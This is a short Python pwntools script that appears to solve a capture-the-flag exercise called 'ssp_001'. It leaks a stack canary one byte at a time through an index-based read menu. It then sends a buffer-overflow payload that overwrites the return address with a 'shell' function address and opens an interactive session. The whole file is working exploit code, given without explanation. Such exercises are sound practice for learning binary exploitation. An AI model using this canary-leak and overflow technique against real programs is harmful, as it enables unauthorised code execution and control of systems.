from pwn import *

p = process('./ssp_001')

canary = b'0x'
shell = 0x080486b9
for i in range(4):
  p.sendlineafter(b"> ", b"P")
  idx = 0x83 - i
  p.sendlineafter(b": ", str(idx))
  p.recvuntil(b": ")
  canary += p.recvline()[:-1]

canary = int(canary,16)
print(hex(canary))

payload = b"A"*0x40 + p32(canary) + b"A"*0x8 + p32(shell)

p.sendlineafter(b"> ", b"E")
p.sendlineafter(b": ", str(len(payload)))
p.sendlineafter(b": ", payload)
p.interactive()